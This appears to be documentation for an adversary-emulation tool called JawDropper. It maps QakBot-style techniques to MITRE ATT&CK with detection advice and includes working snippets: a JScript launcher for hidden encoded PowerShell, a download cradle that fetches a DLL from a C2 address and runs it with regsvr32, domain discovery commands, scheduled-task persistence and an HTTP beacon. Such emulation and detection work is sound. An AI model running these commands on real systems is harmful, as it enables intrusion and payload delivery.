# JawDropper MITRE ATT&CK Mapping

```
============================================================================
ESINTA EMULATION — AUTHORIZED SECURITY TESTING ONLY

Complete mapping of JawDropper techniques to MITRE ATT&CK framework.
All techniques are documented in CISA AA23-242A and MITRE S0650 (QakBot).
============================================================================
```

## Technique Summary

| ID | Technique | Tactic | JawDropper Component |
|----|-----------|--------|---------------------|
| T1204.002 | User Execution: Malicious File | Execution | dropper.js double-click |
| T1059.007 | JavaScript | Execution | dropper.js via wscript.exe |
| T1059.001 | PowerShell | Execution | Download cradle |
| T1105 | Ingress Tool Transfer | Command and Control | DLL download |
| T1218.010 | Regsvr32 | Defense Evasion | DLL execution |
| T1497.003 | Time-Based Evasion | Defense Evasion | Sleep(2000) |
| T1033 | System Owner/User Discovery | Discovery | whoami |
| T1016 | System Network Configuration Discovery | Discovery | ipconfig, arp |
| T1018 | Remote System Discovery | Discovery | net view, nslookup |
| T1482 | Domain Trust Discovery | Discovery | nltest |
| T1053.005 | Scheduled Task | Persistence | schtasks /create |
| T1071.001 | Web Protocols | Command and Control | HTTP beacon |

## Detailed Technique Descriptions

### T1204.002 — User Execution: Malicious File

**Tactic:** Execution

**Description:** An adversary may rely upon a user opening a malicious file in order to gain execution.

**JawDropper Implementation:**
- User double-clicks `dropper.js`
- Windows executes via default file association

**Real QakBot Behavior:**
- Distributed via phishing emails with ZIP attachments
- ZIP contains malicious JS, LNK, or Office documents
- User must extract and execute to trigger infection

**Detection:**
- Monitor for execution of script files from user directories
- Alert on wscript.exe/cscript.exe spawning child processes

---

### T1059.007 — Command and Scripting Interpreter: JavaScript

**Tactic:** Execution

**Description:** Adversaries may abuse JavaScript for execution.

**JawDropper Implementation:**
```javascript
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell.exe -encodedcommand ...", 0, false);
```

**Real QakBot Behavior:**
- Uses JScript for initial execution
- Creates WScript.Shell to spawn processes
- Often includes obfuscation (we omit this)

**Detection:**
- Process creation: wscript.exe with .js argument
- Script creates WScript.Shell ActiveX object
- Child process spawned from wscript.exe

---

### T1059.001 — Command and Scripting Interpreter: PowerShell

**Tactic:** Execution

**Description:** Adversaries may abuse PowerShell commands and scripts for execution.

**JawDropper Implementation:**
```
powershell.exe -WindowStyle Hidden -ep Bypass -encodedcommand <base64>
```

**Decoded command:**
```powershell
$c2 = "http://192.168.0.148:8888"
$outPath = "$env:TEMP\update.dll"
Invoke-WebRequest -Uri "$c2/payloads/payload.dll" -OutFile $outPath
Start-Process "regsvr32.exe" -ArgumentList "/s $outPath"
```

**Real QakBot Behavior:**
- Uses encoded PowerShell commands
- Downloads payload via WebClient or Invoke-WebRequest
- Hidden window to avoid user detection

**Detection:**
- PowerShell with -encodedcommand flag
- PowerShell script block logging
- Network connection from PowerShell process

---

### T1105 — Ingress Tool Transfer

**Tactic:** Command and Control

**Description:** Adversaries may transfer tools or other files from an external system into a compromised environment.

**JawDropper Implementation:**
```powershell
Invoke-WebRequest -Uri "http://192.168.0.148:8888/payloads/payload.dll" -OutFile "$env:TEMP\update.dll"
```

**Real QakBot Behavior:**
- Downloads DLL payloads from compromised websites
- Uses HTTP/HTTPS for transfer
- Saves to temporary directories

**Detection:**
- Network connection to unusual destinations
- File write to TEMP directory
- DLL file creation event

---

### T1218.010 — Signed Binary Proxy Execution: Regsvr32

**Tactic:** Defense Evasion

**Description:** Adversaries may abuse Regsvr32.exe to proxy execution of malicious code.

**JawDropper Implementation:**
```
regsvr32.exe /s C:\Users\...\AppData\Local\Temp\update.dll
```

**Real QakBot Behavior:**
- Uses regsvr32 to execute DLL payloads
- Silent flag (/s) suppresses dialogs
- Abuses DllRegisterServer export

**Detection:**
- regsvr32.exe loading DLL from TEMP
- regsvr32.exe spawning unusual child processes
- DLL loaded without actual COM registration

---

### T1497.003 — Virtualization/Sandbox Evasion: Time Based

**Tactic:** Defense Evasion

**Description:** Adversaries may employ time-based methods to detect and avoid virtualization/sandbox environments.

**JawDropper Implementation:**
```c
Sleep(2000);  // 2 second delay before activity
```

**Real QakBot Behavior:**
- Uses timing checks to detect sandbox acceleration
- May check time between calls
- Delays execution to evade automated analysis

**Detection:**
- Delay between process start and first activity
- (Behavioral analysis of timing patterns)

---

### T1033 — System Owner/User Discovery

**Tactic:** Discovery

**Description:** Adversaries may attempt to identify the primary user, currently logged in user, or set of users that commonly use a system.

**JawDropper Implementation:**
```
cmd.exe /c whoami
```

**Real QakBot Behavior:**
- Executes whoami to identify current user
- Used to determine privilege level
- Informs further attack decisions

**Detection:**
- whoami execution from suspicious parent
- Part of discovery command burst

---

### T1016 — System Network Configuration Discovery

**Tactic:** Discovery

**Description:** Adversaries may look for details about the network configuration and settings of systems they access.

**JawDropper Implementation:**
```
cmd.exe /c ipconfig /all
cmd.exe /c arp -a
```

**Real QakBot Behavior:**
- Enumerates network adapters and configuration
- Examines ARP cache for network topology
- Identifies domain membership

**Detection:**
- ipconfig execution from suspicious parent
- Multiple network discovery commands in sequence

---

### T1018 — Remote System Discovery

**Tactic:** Discovery

**Description:** Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier.

**JawDropper Implementation:**
```
cmd.exe /c net view
cmd.exe /c nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%USERDNSDOMAIN%
```

**Real QakBot Behavior:**
- Uses net view to find network shares
- DNS queries for domain controllers
- Maps network topology for lateral movement

**Detection:**
- net view execution
- DNS queries for LDAP SRV records
- Multiple remote system discovery commands

---

### T1482 — Domain Trust Discovery

**Tactic:** Discovery

**Description:** Adversaries may attempt to gather information on domain trust relationships.

**JawDropper Implementation:**
```
cmd.exe /c nltest /domain_trusts /all_trusts
```

**Real QakBot Behavior:**
- Uses nltest to enumerate domain trusts
- Identifies paths for lateral movement
- Maps Active Directory structure

**Detection:**
- nltest execution with trust-related flags
- Domain trust enumeration activity

---

### T1053.005 — Scheduled Task/Job: Scheduled Task

**Tactic:** Persistence

**Description:** Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution.

**JawDropper Implementation:**
```
schtasks /create /tn "JawDropper" /tr "calc.exe" /sc daily /st 09:00 /f
```

**Real QakBot Behavior:**
- Creates scheduled tasks for persistence
- Task typically runs regsvr32 with DLL path
- Uses daily or logon triggers

**Safety Note:** JawDropper creates a task that runs calc.exe, not the DLL.

**Detection:**
- schtasks /create execution
- Event ID 4698: Scheduled task created
- Task triggering executable from unusual location

---

### T1071.001 — Application Layer Protocol: Web Protocols

**Tactic:** Command and Control

**Description:** Adversaries may communicate using application layer protocols associated with web traffic.

**JawDropper Implementation:**
```
HTTP POST http://192.168.0.148:8888/beacon
Body: {"hostname": "...", "pid": ..., "stage": "loader_complete"}
```

**Real QakBot Behavior:**
- Uses HTTP/HTTPS for C2 communication
- Encrypted payloads (we use plaintext)
- Beacons with system information

**Detection:**
- HTTP traffic to unusual internal IPs
- POST requests with JSON body
- WinHTTP usage from unexpected processes

## ATT&CK Navigator Layer

To visualize these techniques in MITRE ATT&CK Navigator:

1. Go to https://mitre-attack.github.io/attack-navigator/
2. Create new layer
3. Select techniques: T1204.002, T1059.007, T1059.001, T1105, T1218.010, T1497.003, T1033, T1016, T1018, T1482, T1053.005, T1071.001

## References

- [MITRE ATT&CK: QakBot (S0650)](https://attack.mitre.org/software/S0650/)
- [CISA AA23-242A](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a)
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
